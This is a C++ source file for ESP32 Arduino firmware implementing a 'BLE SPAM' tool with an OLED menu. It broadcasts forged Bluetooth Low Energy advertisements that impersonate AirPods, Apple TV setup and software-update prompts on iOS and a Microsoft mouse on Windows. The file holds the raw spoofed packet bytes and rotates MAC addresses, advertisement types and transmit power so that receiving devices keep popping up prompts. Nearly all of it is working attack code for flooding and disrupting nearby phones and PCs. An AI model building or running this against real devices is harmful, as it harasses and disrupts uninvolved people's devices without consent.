#include "ble_spam.h"

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <U8g2lib.h>
#include <WiFi.h>
#include <esp_gap_ble_api.h>
#include <string>
#include <string.h>

#include "app_config.h"
#include "bt_remote.h"
#include "devices.hpp"
#include "input_manager.h"
#include "ui_theme.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern bool runningApp;

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P9
#endif

enum class BleSpamTarget : uint8_t {
    None = 0,
    Apple,
    Windows
};

struct AppleProfile {
    const char* label;
    int8_t deviceIndex;
    bool randomDevice;
};

static const AppleProfile APPLE_PROFILES[] = {
    { "AIRPODS", AIRPODS, false },
    { "RANDOM", -1, true },
    { "UPDATE", SOFTWARE_UPDATE, false },
    { "AIRPODS 2", AIRPODS_GEN_2, false },
    { "VISION", VISION_PRO, false },
    { "AIRPODS MAX", AIRPODS_MAX, false },
    { "ATV SETUP", APPLETV_SETUP, false },
    { "TRANSFER", TRANSFER_NUMBER, false },
    { "ATV PAIR", APPLETV_PAIR, false }
};

static const uint8_t APPLE_PACKET[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
};

static const uint8_t WINDOWS_PACKET[] = {
    0x1e, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t TARGET_COUNT = 2;
static const uint16_t ADV_ON_MS = 100;

static BLEServer* bleSpamServer = nullptr;
static BLEAdvertising* bleSpamAdvertising = nullptr;
static BleSpamTarget activeTarget = BleSpamTarget::None;
static BleSpamTarget engineTarget = BleSpamTarget::None;
static bool bleEngineReady = false;
static bool burstRunning = false;
static uint8_t selectedTarget = 0;
static uint8_t appleProfileIndex = 0;
static uint8_t animFrame = 0;
static uint32_t lastFrameMs = 0;
static uint32_t lastCycleMs = 0;
static uint32_t burstStartedMs = 0;
static uint32_t packetCount = 0;
static char currentPayloadLabel[24] = "READY";

void generatePacket(const AppleDevice& device, uint8_t* buffer, size_t& outLength) {
    memset(buffer, 0, 31);

    if (device.type == APPLE_AUDIO) {
        outLength = 31;
        const uint8_t header[] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07 };
        const uint8_t body[] = {
            0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
            0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
            0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
        };

        memcpy(buffer, header, sizeof(header));
        buffer[7] = device.modelId;
        memcpy(buffer + 8, body, sizeof(body));
        return;
    }

    outLength = 23;
    const uint8_t prefix[] = {
        0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
        0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1
    };
    const uint8_t suffix[] = {
        0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
    };

    memcpy(buffer, prefix, sizeof(prefix));
    buffer[13] = device.modelId;
    memcpy(buffer + 14, suffix, sizeof(suffix));
}

static void setPayloadLabel(const char* label) {
    strncpy(currentPayloadLabel, label, sizeof(currentPayloadLabel) - 1);
    currentPayloadLabel[sizeof(currentPayloadLabel) - 1] = '\0';
}

static const char* targetName(BleSpamTarget target) {
    switch (target) {
        case BleSpamTarget::Apple:   return "APPLE iOS";
        case BleSpamTarget::Windows: return "WINDOWS";
        default:                     return "SELECT";
    }
}

static void addRawAdvertisement(BLEAdvertisementData& data, const uint8_t* packet, size_t len) {
    data.addData(std::string(reinterpret_cast<const char*>(packet), len));
}

static void fillRandomAddress(esp_bd_addr_t address) {
    for (uint8_t i = 0; i < 6; i++) {
        address[i] = random(0, 256);
        if (i == 0) address[i] |= 0xF0;
    }
}

static void applyRandomTxPower() {
    const int pick = random(100);
    if (pick < 70) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, BLE_SPAM_MAX_TX_POWER);
    } else if (pick < 85) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(BLE_SPAM_MAX_TX_POWER - 1));
    } else if (pick < 95) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(BLE_SPAM_MAX_TX_POWER - 2));
    } else if (pick < 99) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(BLE_SPAM_MAX_TX_POWER - 3));
    } else {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(BLE_SPAM_MAX_TX_POWER - 4));
    }
}

static void setRandomAdvertisementType() {
    const uint8_t choice = random(3);
    if (choice == 0) {
        bleSpamAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (choice == 1) {
        bleSpamAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
        bleSpamAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }
}

static const AppleDevice& currentAppleDevice() {
    const AppleProfile& profile = APPLE_PROFILES[appleProfileIndex];
    if (profile.randomDevice) {
        return ALL_DEVICES[random(0, NUM_DEVICES)];
    }
    return ALL_DEVICES[profile.deviceIndex];
}

static void setAppleAdvertisement(BLEAdvertisementData& data) {
    setPayloadLabel("AirPods Pro");
    addRawAdvertisement(data, APPLE_PACKET, sizeof(APPLE_PACKET));
}

static void setWindowsAdvertisement(BLEAdvertisementData& data) {
    setPayloadLabel("Microsoft Mouse");
    addRawAdvertisement(data, WINDOWS_PACKET, sizeof(WINDOWS_PACKET));
}

static void stopBurst() {
    if (bleSpamAdvertising != nullptr && burstRunning) {
        bleSpamAdvertising->stop();
    }
    burstRunning = false;
}

static void ensureBleEngine(BleSpamTarget target) {
    if (bleEngineReady && bleSpamAdvertising != nullptr && engineTarget == target) return;

    if (bleEngineReady) {
        stopBurst();
        BLEDevice::deinit(false);
        btRemoteMarkBleReleased();
        delay(120);
        bleSpamAdvertising = nullptr;
        bleSpamServer = nullptr;
        bleEngineReady = false;
        engineTarget = BleSpamTarget::None;
    }

    WiFi.mode(WIFI_OFF);
    BLEDevice::init(target == BleSpamTarget::Windows ? "Microsoft Mouse" : "AirPods Pro");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, BLE_SPAM_MAX_TX_POWER);

    bleSpamServer = BLEDevice::createServer();
    bleSpamAdvertising = bleSpamServer->getAdvertising();

    esp_bd_addr_t initialAddress = { 0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69 };
    bleSpamAdvertising->setDeviceAddress(initialAddress, BLE_ADDR_TYPE_RANDOM);
    bleEngineReady = true;
    engineTarget = target;
}

static void startTarget(BleSpamTarget target) {
    stopBurst();
    ensureBleEngine(target);
    activeTarget = target;
    packetCount = 0;
    lastCycleMs = 0;
    burstStartedMs = 0;
    setPayloadLabel(target == BleSpamTarget::Apple ? "AirPods Pro" : "Microsoft Mouse");
}

static void stopTarget() {
    stopBurst();
    activeTarget = BleSpamTarget::None;
    packetCount = 0;
    lastCycleMs = 0;
}

static void serviceAdvertisementOnce() {
    if (activeTarget == BleSpamTarget::None || bleSpamAdvertising == nullptr) return;

    BLEAdvertisementData advertisementData;
    if (activeTarget == BleSpamTarget::Apple) {
        setAppleAdvertisement(advertisementData);
    } else {
        setWindowsAdvertisement(advertisementData);
    }

    esp_bd_addr_t address;
    fillRandomAddress(address);
    setRandomAdvertisementType();
    bleSpamAdvertising->setDeviceAddress(address, BLE_ADDR_TYPE_RANDOM);
    bleSpamAdvertising->setAdvertisementData(advertisementData);
    bleSpamAdvertising->start();

    burstRunning = true;
    burstStartedMs = millis();
    lastCycleMs = burstStartedMs;
    packetCount++;
}

static void drawBleGlyph(int x, int y, uint8_t frame) {
    u8g2.drawLine(x + 12, y + 2, x + 12, y + 28);
    u8g2.drawLine(x + 12, y + 2, x + 23, y + 10);
    u8g2.drawLine(x + 23, y + 10, x + 12, y + 17);
    u8g2.drawLine(x + 12, y + 17, x + 23, y + 24);
    u8g2.drawLine(x + 23, y + 24, x + 12, y + 28);
    u8g2.drawLine(x + 4, y + 9, x + 22, y + 23);
    u8g2.drawLine(x + 4, y + 23, x + 22, y + 9);

    if ((frame % 8) < 4) {
        u8g2.drawCircle(x + 12, y + 15, 15);
    }
}

static void drawMenuRow(int y, const char* label, bool selected) {
    const int boxX = 46;
    const int boxW = 76;
    const int textAreaCenter = boxX + (boxW / 2);
    const int labelX = textAreaCenter - (u8g2.getStrWidth(label) / 2);

    if (selected) {
        u8g2.drawBox(boxX, y - 9, boxW, 12);
        u8g2.setDrawColor(0);
    }

    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(labelX, y, label);

    if (selected) {
        u8g2.setDrawColor(1);
    }
}

static void drawTargetMenu() {
    u8g2.clearBuffer();
    UiTheme::drawHeader(u8g2, "BLE SPAM", "TARGET");
    drawBleGlyph(8, 22, animFrame);
    drawMenuRow(32, "APPLE iOS", selectedTarget == 0);
    drawMenuRow(47, "WINDOWS", selectedTarget == 1);
    UiTheme::drawMiniWave(u8g2, 48, 62, animFrame);
    u8g2.sendBuffer();
}

static void drawActiveScreen() {
    u8g2.clearBuffer();
    UiTheme::drawHeader(u8g2, "BLE SPAM", "ON");
    drawBleGlyph(12, 25, animFrame);

    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(48, 27, targetName(activeTarget));

    u8g2.setFont(u8g2_font_5x7_tr);
    char countLine[20];
    snprintf(countLine, sizeof(countLine), "PKT %lu", (unsigned long)packetCount);
    u8g2.drawStr(49, 39, currentPayloadLabel);
    u8g2.drawStr(49, 49, countLine);

    for (uint8_t i = 0; i < 8; i++) {
        int barHeight = 3 + ((animFrame + i * 2) % 14);
        u8g2.drawBox(47 + i * 9, 63 - barHeight, 5, barHeight);
    }

    u8g2.sendBuffer();
}

static void waitForButtonRelease(uint8_t pin) {
    const uint32_t start = millis();
    while (digitalRead(pin) == LOW && millis() - start < 600) {
        delay(5);
        yield();
    }
    Input.resetAll();
}

static bool handleActivePhysicalButtons() {
    if (digitalRead(AppConfig::BTN_BACK) == LOW) {
        stopTarget();
        waitForButtonRelease(AppConfig::BTN_BACK);
        return false;
    }

    return true;
}

static void runBlockingAdvertisementLoop() {
    uint32_t lastUiMs = 0;

    while (runningApp && activeTarget != BleSpamTarget::None) {
        if (!handleActivePhysicalButtons()) break;

        serviceAdvertisementOnce();

        while (burstRunning && millis() - burstStartedMs < ADV_ON_MS) {
            if (!handleActivePhysicalButtons()) break;

            delay(5);
            yield();
        }

        stopBurst();
        applyRandomTxPower();

        if (millis() - lastUiMs >= 120) {
            lastUiMs = millis();
            animFrame++;
            drawActiveScreen();
        }

        yield();
    }

    Input.resetAll();
}

void bleSpamEnter() {
    Input.resetAll();
    BLEDevice::deinit(false);
    btRemoteMarkBleReleased();
    delay(120);
    bleEngineReady = false;
    bleSpamAdvertising = nullptr;
    bleSpamServer = nullptr;
    engineTarget = BleSpamTarget::None;
    selectedTarget = 0;
    appleProfileIndex = 0;
    activeTarget = BleSpamTarget::None;
    burstRunning = false;
    animFrame = 0;
    lastFrameMs = 0;
    lastCycleMs = 0;
    packetCount = 0;
    setPayloadLabel("READY");
}

void bleSpamLoop() {
    const uint32_t now = millis();
    if (now - lastFrameMs >= 120) {
        lastFrameMs = now;
        animFrame++;
    }

    if (activeTarget == BleSpamTarget::None) {
        if (Input.repeating(BTN_ID_UP)) {
            selectedTarget = selectedTarget == 0 ? TARGET_COUNT - 1 : selectedTarget - 1;
        }
        if (Input.repeating(BTN_ID_DOWN)) {
            selectedTarget = (selectedTarget + 1) % TARGET_COUNT;
        }
        if (Input.pressed(BTN_ID_OK)) {
            startTarget(selectedTarget == 0 ? BleSpamTarget::Apple : BleSpamTarget::Windows);
            Input.consume(BTN_ID_OK);
            waitForButtonRelease(AppConfig::BTN_OK);
            drawActiveScreen();
            runBlockingAdvertisementLoop();
            return;
        }
        if (Input.pressed(BTN_ID_BACK)) {
            runningApp = false;
            Input.consume(BTN_ID_BACK);
        }

        drawTargetMenu();
        return;
    }

    runBlockingAdvertisementLoop();
    drawActiveScreen();
}

void bleSpamExit() {
    stopTarget();

    if (bleEngineReady && !btRemoteBleActive()) {
        BLEDevice::deinit(false);
    }

    bleEngineReady = false;
    bleSpamAdvertising = nullptr;
    bleSpamServer = nullptr;
    engineTarget = BleSpamTarget::None;
    WiFi.mode(WIFI_OFF);
}
